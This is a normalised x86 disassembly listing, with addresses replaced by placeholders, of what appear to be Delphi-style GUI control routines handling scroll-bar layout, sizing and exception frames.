mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434714
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41b1fc
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41acd0
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa ] ax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_41b73c
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42f6cc
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a870
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1f0 ] eax
push 0x1
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a870
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1f4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1f8 ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41b7c4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
call sub_44c070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_42f820
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_41b814
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_430998
mov eax [ ebp - 0x8 ]
and [ eax + 0x24 ] 0xfffffffc
pop ecx
pop ecx
pop ebp
retn
sub_41b838
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_430b24
mov eax [ rw-data ]
cmp [ eax + 0x9 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bae8
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call sub_444114
sub_41b86c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41ba10
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4300fc
mov esp ebp
pop ebp
retn
sub_41b898
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x144 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
sub_41b8d4
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41ba05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_42c25c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_41abac
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0xc ]
jg r-xdata
mov [ ebp - 0xd ] al
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0xc ] eax
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_41b1fc
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] 0x0
cmp [ ebp - 0xd ] 0x0
je r-xdata
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4307d8
mov edx eax
mov eax [ ebp - 0x14 ]
call sub_43c264
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
sub edx [ eax + 0x38 ]
mov eax [ ebp - 0x20 ]
sub edx [ eax + 0x30 ]
mov eax [ ebp - 0x20 ]
call sub_42bef4
inc [ ebp - 0x8 ]
dec [ ebp - 0x1c ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba0c
mov eax [ ebp - 0x14 ]
call sub_44c070
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_41a9ac
push 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_43c464
xor ecx ecx
mov edx 0xb03e
call sub_42df28
inc [ ebp - 0x8 ]
dec [ ebp - 0x1c ]
jne r-xdata
sub_41ba10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1fc ] 0x0
jg r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_41aaf4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
call sub_41aaf4
sub_41ba44
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1f8 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1f8 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_41b440
xor edx edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
call sub_41b440
mov eax [ ebp - 0x4 ]
call sub_41ba10
jmp r-xdata
sub_41baa0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41bac4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41bae8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x200 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
xor eax eax
push ebp
push sub_41bbd3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x200 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
call sub_41ad54
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_41ad54
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
mov cl 0x1
xor edx edx
call sub_41b604
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
xor ecx ecx
mov dl 0x1
call sub_41b604
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
xor ecx ecx
xor edx edx
call sub_41b604
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
xor ecx ecx
mov dl 0x1
call sub_41b604
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
mov cl 0x1
xor edx edx
call sub_41b604
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
xor ecx ecx
mov dl 0x1
call sub_41b604
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x200 ] 0x0
retn
sub_41bbe0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41bc14
sub_41bc14
push ebp
mov ebp esp
add esp 0xffffffc8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
movzx eax [ eax + 0x1a ]
sub [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
movzx eax [ eax + 0x1a ]
add [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
movzx eax [ eax + 0x1a ]
sub [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
movzx eax [ eax + 0x1a ]
add [ ebp - 0x1c ] eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_42c3a8
lea edx [ ebp - 0x38 ]
lea ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_42c3e4
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x24 ] eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
call sub_42c3a8
lea edx [ ebp - 0x38 ]
lea ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_42c3e4
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x28 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_42c25c
cmp eax [ ebp - 0x20 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_41b1fc
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_42c25c
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x28 ]
cmp eax edx
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_42c2b0
cmp eax [ ebp - 0x1c ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
call sub_41b1fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_42c25c
mov edx [ ebp - 0x10 ]
mov edx [ edx + 0xc ]
add edx [ ebp - 0x20 ]
sub edx eax
mov eax [ ebp - 0x10 ]
call sub_41b1fc
mov eax [ ebp - 0x4 ]
call sub_42c25c
add eax [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
call sub_42c2b0
mov edx [ ebp - 0x1c ]
sub edx [ ebp - 0x24 ]
cmp eax edx
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
call sub_42c2b0
mov edx [ ebp - 0x18 ]
mov edx [ edx + 0xc ]
add edx [ ebp - 0x1c ]
sub edx eax
mov eax [ ebp - 0x18 ]
call sub_41b1fc
mov eax [ ebp - 0x4 ]
call sub_42c2b0
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
sub_41bdbc
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
mov [ eax + 0x1e ] 0x0
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_41b1fc
xor edx edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
call sub_41b1fc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_41b440
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax [ ebp - 0x14 ]
call sub_41b440
sub_41beac
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41bdbc
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4340dc
mov esp ebp
pop ebp
retn
sub_41beec
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x1fc ]
xor eax eax
push ebp
push sub_41bf65
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43223c
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
sub eax 0x1
jb r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
je r-xdata
mov dl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xbc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bf6c
mov eax [ ebp - 0x4 ]
dec [ eax + 0x1fc ]
retn
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
dec eax
je r-xdata
mov [ ebp - 0x9 ] 0x2
jmp r-xdata
sub_41bf6c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x200 ] 0x1
xor eax eax
push ebp
push sub_41bfa4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41ba10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bfab
mov eax [ ebp - 0x4 ]
mov [ eax + 0x200 ] 0x0
retn
sub_41bfab
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bae8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
sub_41bfd8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_431f64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_41ade8
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_41c020
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_431f94
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
call sub_41ade8
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_41c068
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42c2b0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1f4 ]
mov edx [ edx + 0x10 ]
call sub_444824
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_42c25c
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
mov eax [ eax + 0x10 ]
call sub_444824
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f4 ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
mov eax [ eax + 0xc ]
neg eax
call sub_43b800
mov eax [ ebp - 0x8 ]
lea esi [ ebp - 0x18 ]
mov edi eax
mov ecx 0x4
[ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42faa8
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_41c0f4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41c155
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43367c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c15c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_41c184
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41b73c
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
mov [ eax + 0x40 ] edx
mov edx 0xb9
mov eax [ ebp - 0x4 ]
call sub_42bf6c
mov edx 0x29
mov eax [ ebp - 0x4 ]
call sub_42bfa8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x208 ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41c200
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b814
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x208 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x8 ]
or [ edx + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x138 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x4 ] 0xff7fffff
mov eax [ ebp - 0x8 ]
or [ eax + 0x8 ] 0x200
sub_41c268
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x208 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x208 ] al
mov eax [ ebp - 0x4 ]
call sub_430fcc
sub_41c29c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop ecx
pop ecx
pop ebp
retn
sub_41c2b8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_433a38
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_430fcc
sub_41c2f4
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
xor ebx ebx
mov [ ebp - 0x118 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c3ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41b73c
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
mov [ eax + 0x40 ] edx
mov eax [ ebp - 0x4 ]
call sub_44bfb8
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov edx 0x140
mov eax [ ebp - 0x4 ]
call sub_42bf6c
mov edx 0xf0
mov eax [ ebp - 0x4 ]
call sub_42bfa8
mov eax [ ebp - 0x4 ]
test [ eax + 0x21 ] 0x4
jne r-xdata
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_43c174
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c3f3
lea eax [ ebp - 0x118 ]
call sub_44cae0
retn
lea edx [ ebp - 0x114 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44bfbc
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x4
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
call sub_44c7a8
jmp r-xdata
sub_41c418
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b814
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x1c ] eax
sub_41c44c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_434eb8
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_442a48
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_442a08
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov bx 0xfff2
call sub_44c24c
test al al
jne r-xdata
sub_41c4c0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x2c8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x2c8 ]
call sub_43c264
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0xc ]
mov [ edx + 0x2c8 ] eax
sub_41c514
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x2c8 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x2c8 ]
call sub_43c728
sub_41c554
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov cl [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42bbcc
mov al [ ebp - 0x9 ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
je r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c4c0
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c514
sub_41c5bc
push ebp
mov ebp esp
add esp 0xfffffff0
